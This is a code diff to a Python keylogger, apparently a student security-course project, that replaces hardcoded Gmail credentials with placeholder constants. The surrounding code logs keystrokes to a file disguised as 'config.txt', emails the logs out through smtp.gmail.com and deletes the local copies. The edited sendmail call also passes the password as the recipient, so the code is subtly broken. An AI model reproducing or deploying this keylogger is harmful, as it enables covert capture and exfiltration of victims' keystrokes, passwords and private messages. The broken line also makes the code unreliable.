@@ -11,6 +11,9 @@ from os import remove
 from time import sleep
 from multiprocessing import Process, freeze_support
 
+EMAIL = "email@email.com"
+PASSWORD = "password"
+
 # Keyboard logger
 def on_press(key):
     with open("config.txt", "a") as log:
@@ -46,8 +49,8 @@ def send_logs():
 
     # Set log details
     msg = MIMEMultipart()
-    msg['From'] = "scruffy.comp681.sa@gmail.com"
-    msg['To'] = "scruffy.comp6841.sa@gmail.com"
+    msg['From'] = EMAIL
+    msg['To'] = EMAIL
     msg['Subject'] = f"log: {date_time}"
 
     # Attach log files
@@ -73,8 +76,8 @@ def send_logs():
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.ehlo()
     server.starttls()
-    server.login("scruffy.comp6841.sa@gmail.com", "REDACTED")
-    server.sendmail("scruffy.comp6841.sa@gmail.com", "scruffy.comp6841.sa@gmail.com", msg.as_string())
+    server.login(EMAIL, PASSWORD)
+    server.sendmail(EMAIL, PASSWORD, msg.as_string())
 
     # Delete logs
     remove(filename1)
